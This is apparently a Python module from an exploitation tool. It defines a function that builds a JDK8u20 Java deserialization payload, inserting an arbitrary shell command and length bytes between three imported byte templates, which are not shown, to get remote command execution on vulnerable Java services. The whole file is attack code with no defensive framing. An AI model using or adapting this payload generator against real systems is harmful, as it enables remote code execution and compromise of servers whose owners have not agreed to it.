from src.payloads.generate_jdk8u20_payload import payload_1__generate_jdk8u20_payload, \
    payload_2__generate_jdk8u20_payload, payload_3__generate_jdk8u20_payload


def generate_jdk8u20_payload(cmd: str) -> bytes:
    payload = payload_1__generate_jdk8u20_payload
    cmd_bytes = cmd.encode('utf-8')
    payload += (len(cmd_bytes) + 147).to_bytes(1, 'big')
    payload += payload_2__generate_jdk8u20_payload
    payload += len(cmd_bytes).to_bytes(1, 'big') + cmd_bytes
    payload += payload_3__generate_jdk8u20_payload
    return payload
